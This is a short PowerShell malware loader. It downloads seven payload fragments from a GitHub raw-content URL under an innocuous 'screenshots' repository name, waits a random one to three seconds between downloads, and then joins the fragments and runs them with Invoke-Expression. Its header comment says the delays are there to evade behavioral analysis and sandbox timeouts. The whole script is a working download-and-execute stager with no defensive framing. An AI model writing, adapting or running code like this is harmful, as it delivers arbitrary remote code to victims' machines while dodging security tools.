<#====================================================================
  LOADER — TIME-DELAYED REASSEMBLY
  Random 1-3s delay between fragment downloads to evade
  behavioral analysis / sandbox timeouts.
====================================================================#>

$base = "https://raw.githubusercontent.com/cem324/screenshots/main"
$total = 7
$parts = @()

function Get-PayloadPart {
    param([int]$i, [string]$baseUrl)
    $wc = New-Object System.Net.WebClient
    return $wc.DownloadString("$baseUrl/f$i")
}

0..($total - 1) | % {
    $parts += Get-PayloadPart -i $_ -baseUrl $base
    $delay = (Get-Random -Minimum 1 -Maximum 4)
    Start-Sleep -Seconds $delay
}

$full = $parts -join ""
iex $full